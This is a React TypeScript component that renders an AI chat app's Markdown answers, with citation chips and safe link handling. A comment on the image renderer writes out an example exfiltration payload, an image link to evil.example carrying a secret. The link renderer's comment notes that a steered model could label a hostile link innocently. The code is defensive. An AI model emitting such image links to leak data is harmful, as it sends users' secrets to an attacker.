"use client";

import { createContext, memo, useContext, useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

import { prefersReducedMotion } from "@/components/canvas/canvas-view";
import { CodeBlock } from "@/components/chat/CodeBlock";
import type { Citation } from "@/lib/api";
import { citeMarker, withCitationLinks } from "@/lib/markdown-citations";
import { externalHost, imageNote, textShowsAddress } from "@/lib/safe-links";
import { cn } from "@/lib/utils";

type CitationStateValue = {
  activeMarker?: number | null;
  onFocus?: (marker: number | null) => void;
};

/** The hover/active chip state, handed to the link renderer by context so the
 *  renderers below can live at module scope. Renderers made inside the
 *  component are new component types on every render, which remounts the whole
 *  rendered Markdown (and every chip under the cursor) on each keystroke. */
const CitationState = createContext<CitationStateValue>({});

const REMARK_PLUGINS = [remarkGfm];

/** A citation chip (docs/DESIGN.md section 7): small, radius 4, tinted in
 *  the knowledge line's colour, filled when its source is the active one.
 *  Shared with the sources list so the two always match. */
export function citationChipClass(active: boolean): string {
  return cn(
    "num text-small inline-flex h-5 min-w-5 shrink-0 items-center justify-center rounded-sm px-1 align-text-bottom font-medium transition-colors duration-120 ease-out",
    active ? "bg-node-kb text-node-icon" : "bg-node-kb/15 text-foreground",
  );
}

/** Plain text of a parsed (hast) node, for copying a fenced code block. */
type HastNode = { type?: string; value?: string; children?: HastNode[] };
function hastText(node: HastNode | undefined): string {
  if (!node) return "";
  if (node.type === "text") return node.value ?? "";
  return (node.children ?? []).map(hastText).join("");
}

const COMPONENTS: Components = {
  a: function CitationLink({ node, href, children }) {
    const { activeMarker, onFocus } = useContext(CitationState);
    const marker = citeMarker(href);
    if (marker === null) {
      // A link to another site says where it goes before anyone clicks
      // (lib/safe-links.ts): text the model was steered into writing can
      // label a link to anywhere "Refund policy". No origin is passed, so
      // the server render and the browser agree.
      const host = externalHost(href);
      const showHost = host !== null && !textShowsAddress(hastText(node as HastNode), href ?? "");
      return (
        <>
          <a
            href={href}
            target="_blank"
            rel="noopener noreferrer"
            title={host ? href : undefined}
            className="text-foreground focus-visible:ring-ring rounded-sm underline decoration-1 underline-offset-[3px] hover:decoration-2 focus-visible:ring-2 focus-visible:outline-none"
          >
            {children}
          </a>
          {showHost ? <span className="text-muted-foreground text-small"> ({host})</span> : null}
        </>
      );
    }
    return (
      <button
        type="button"
        onClick={(e) => {
          // The source row under this same answer: every answer numbers its
          // sources from 1, so a page-wide id lookup finds the first answer's.
          const id = `citation-${marker}`;
          const row =
            e.currentTarget.closest("article")?.querySelector<HTMLElement>(`[id="${id}"]`) ??
            document.getElementById(id);
          if (row) {
            row.scrollIntoView({
              behavior: prefersReducedMotion() ? "auto" : "smooth",
              block: "nearest",
            });
            // Keyboard users land on the source too, not left on the chip.
            row.querySelector<HTMLElement>("button[aria-expanded]")?.focus({ preventScroll: true });
          }
          onFocus?.(marker);
        }}
        onMouseEnter={() => onFocus?.(marker)}
        onMouseLeave={() => onFocus?.(null)}
        onFocus={() => onFocus?.(marker)}
        onBlur={() => onFocus?.(null)}
        className={cn(
          citationChipClass(activeMarker === marker),
          "hover:bg-node-kb hover:text-node-icon focus-visible:ring-ring mx-0.5 focus-visible:ring-2 focus-visible:ring-offset-1 focus-visible:outline-none",
        )}
        aria-label={`Source ${marker}`}
        title={`Source ${marker}`}
      >
        {marker}
      </button>
    );
  },
  // An answer's headings sit under the thread's own heading.
  h1: ({ children }) => <h3 className="text-h3 mt-6 mb-2 font-semibold first:mt-0">{children}</h3>,
  h2: ({ children }) => <h4 className="text-h4 mt-5 mb-2 font-semibold first:mt-0">{children}</h4>,
  h3: ({ children }) => <h5 className="text-h4 mt-4 mb-1 font-semibold first:mt-0">{children}</h5>,
  h4: ({ children }) => <h6 className="text-h4 mt-4 mb-1 font-semibold first:mt-0">{children}</h6>,
  p: ({ children }) => <p className="my-3 first:mt-0 last:mb-0">{children}</p>,
  ul: ({ children }) => (
    <ul className="marker:text-muted-foreground my-3 list-disc space-y-1 pl-5 first:mt-0 last:mb-0">
      {children}
    </ul>
  ),
  ol: ({ children }) => (
    <ol className="marker:text-muted-foreground num my-3 list-decimal space-y-1 pl-6 first:mt-0 last:mb-0">
      {children}
    </ol>
  ),
  li: ({ children }) => <li className="pl-1">{children}</li>,
  blockquote: ({ children }) => (
    <blockquote className="border-border text-muted-foreground my-3 border-l-2 pl-4">
      {children}
    </blockquote>
  ),
  strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
  code: ({ className: lang, children }) =>
    lang ? (
      <code className={lang}>{children}</code>
    ) : (
      <code className="bg-muted text-code rounded-sm px-1 py-px font-mono [pre_&]:rounded-none [pre_&]:bg-transparent [pre_&]:p-0">
        {children}
      </code>
    ),
  pre: ({ node, children }) => (
    <CodeBlock code={hastText(node as HastNode).replace(/\n$/, "")} className="my-3" label="Code">
      {children}
    </CodeBlock>
  ),
  // A wide table scrolls sideways in its own box, which takes focus so the
  // arrow keys can scroll it without a mouse.
  table: ({ children }) => (
    <div
      tabIndex={0}
      role="region"
      aria-label="Table"
      className="focus-visible:ring-ring my-3 max-w-full overflow-x-auto rounded-md focus-visible:ring-2 focus-visible:outline-none"
    >
      <table className="text-body w-full border-collapse text-left">{children}</table>
    </div>
  ),
  th: ({ children }) => (
    <th className="border-border border-b py-1.5 pr-4 align-bottom font-semibold">{children}</th>
  ),
  td: ({ children }) => (
    <td className="border-border border-b py-1.5 pr-4 align-top">{children}</td>
  ),
  hr: () => <hr className="border-border my-5" />,
  // Never loaded: an image in model output is fetched the moment it renders,
  // with no click, so `![](https://evil.example/?d=<secret>)` would send data
  // out (Phase 7a.2, lib/safe-links.ts). A note says what was left out.
  img: ({ alt, src }) => (
    <span className="border-border text-muted-foreground text-small inline-block rounded-sm border px-1.5 py-0.5">
      {imageNote(alt, typeof src === "string" ? src : undefined)}
    </span>
  ),
};

/** Rendered Markdown for answers and retrieved passages.
 *
 *  Reading type (15/24) at a 68ch measure by default; pass `className` to
 *  set another size or measure. react-markdown builds React elements and
 *  does not render raw HTML, so a model (or a retrieved document) cannot
 *  inject markup into the page. Citation markers arrive as `#cite-n` links
 *  (see `withCitationLinks`) and render as the same chips the sources list
 *  highlights. */
export function Markdown({
  text,
  citations = [],
  activeMarker,
  onFocus,
  className,
}: {
  text: string;
  citations?: Citation[];
  activeMarker?: number | null;
  onFocus?: (marker: number | null) => void;
  className?: string;
}) {
  const source = citations.length ? withCitationLinks(text, citations) : text;

  const state = useMemo(() => ({ activeMarker, onFocus }), [activeMarker, onFocus]);

  return (
    <div className={cn("text-reading text-foreground max-w-[68ch] min-w-0 break-words", className)}>
      <CitationState.Provider value={state}>
        <ParsedMarkdown source={source} />
      </CitationState.Provider>
    </div>
  );
}

/** Parsing is the expensive part; it reruns only when the text changes. */
const ParsedMarkdown = memo(function ParsedMarkdown({ source }: { source: string }) {
  return (
    <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={COMPONENTS}>
      {source}
    </ReactMarkdown>
  );
});
